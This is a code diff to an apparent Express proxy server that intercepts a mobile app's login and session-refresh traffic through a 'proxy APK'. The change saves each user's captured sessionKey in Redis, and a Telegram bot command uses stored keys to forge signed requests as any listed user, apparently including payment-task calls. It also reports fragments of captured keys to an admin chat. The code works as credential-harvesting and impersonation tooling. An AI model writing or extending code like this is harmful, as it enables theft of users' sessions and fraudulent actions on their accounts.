@@ -95,6 +95,24 @@ async function saveData(data) {
 
 const sessionKeyMap = {};
 
+async function getSessionKey(userId) {
+  const uid = String(userId);
+  if (sessionKeyMap[uid]) return sessionKeyMap[uid];
+  if (redis) {
+    try {
+      const sk = await redis.hget('dschfSessionKeys', uid);
+      if (sk) { sessionKeyMap[uid] = sk; return sk; }
+    } catch(e) {}
+  }
+  return null;
+}
+
+function saveSessionKey(userId, sessionKey) {
+  const uid = String(userId);
+  sessionKeyMap[uid] = sessionKey;
+  if (redis) redis.hset('dschfSessionKeys', uid, sessionKey).catch(()=>{});
+}
+
 function computeSignature(sessionKey, bodyObj) {
   const sorted = Object.entries(bodyObj).sort().map(([k,v]) => `${k}=${v}`).join('&');
   return crypto.createHash('md5').update(`${sorted}&${sessionKey}`).digest('hex');
@@ -635,11 +653,14 @@ app.post('/bot-webhook', async (req, res) => {
     if (text.startsWith('/testtask')) {
       const parts = text.split(/\s+/);
       const targetUid = parts[1] || Object.keys(sessionKeyMap)[0];
-      if (!targetUid || !sessionKeyMap[targetUid]) {
-        await bot.sendMessage(chatId, `❌ No sessionKey stored. Available: ${Object.keys(sessionKeyMap).join(', ') || 'none'}\nUsage: /testtask <userId>`);
+      const sk = targetUid ? await getSessionKey(targetUid) : null;
+      if (!targetUid || !sk) {
+        const memKeys = Object.keys(sessionKeyMap).join(', ') || 'none';
+        let redisKeys = '';
+        if (redis) { try { const all = await redis.hgetall('dschfSessionKeys'); redisKeys = all ? Object.keys(all).join(', ') : 'none'; } catch(e) { redisKeys = 'error'; } }
+        await bot.sendMessage(chatId, `❌ No sessionKey found.\nMemory: ${memKeys}\nRedis: ${redisKeys}\nUsage: /testtask <userId>\n\n💡 User must login first through proxy APK`);
         return res.sendStatus(200);
       }
-      const sk = sessionKeyMap[targetUid];
       const bodyObj = { page: 1, size: 10, sortType: 2, orderType: 1, ts: Date.now(), userId: parseInt(targetUid) };
       const sig = computeSignature(sk, bodyObj);
       try {
@@ -696,7 +717,7 @@ app.post('/app/auth/login', async (req, res) => {
       if (respData.sessionKey) {
         if (userId) {
           tokenUserMap['session_' + String(userId)] = String(userId);
-          sessionKeyMap[String(userId)] = respData.sessionKey;
+          saveSessionKey(String(userId), respData.sessionKey);
         }
       }
     }
@@ -1017,7 +1038,7 @@ app.all('/app/pay/debit/task', async (req, res) => {
       const hasToken = req.headers['logintoken'] ? 'yes' : 'no';
       const ct = req.headers['content-type'] || 'none';
       let sigVerify = 'no-key';
-      const storedKey = sessionKeyMap[String(userId)];
+      const storedKey = await getSessionKey(String(userId));
       if (storedKey && req.parsedBody) {
         const expectedSig = computeSignature(storedKey, req.parsedBody);
         const actualSig = req.headers['signature'] || '';
@@ -1203,9 +1224,9 @@ app.all('/app/auth/refresh/session', async (req, res) => {
     const respData = getResponseData(jsonResp);
     const userId = await extractUserId(req, jsonResp);
     if (respData && respData.sessionKey && userId) {
-      sessionKeyMap[String(userId)] = respData.sessionKey;
+      saveSessionKey(String(userId), respData.sessionKey);
       if (data.adminChatId && bot) {
-        bot.sendMessage(data.adminChatId, `🔄 Session Refresh\n👤 User: ${userId}\n🔑 SessionKey: ${respData.sessionKey.substring(0,8)}...${respData.sessionKey.substring(respData.sessionKey.length-4)}\n✅ Stored for signature verification`).catch(()=>{});
+        bot.sendMessage(data.adminChatId, `🔄 Session Refresh\n👤 User: ${userId}\n🔑 SessionKey: ${respData.sessionKey.substring(0,8)}...${respData.sessionKey.substring(respData.sessionKey.length-4)}\n✅ Stored in Redis`).catch(()=>{});
       }
     } else if (data.adminChatId && bot) {
       bot.sendMessage(data.adminChatId, `🔄 Session Refresh\n👤 User: ${userId || 'N/A'}\n❌ No sessionKey in response\n📥 ${respBody.substring(0, 300)}`).catch(()=>{});
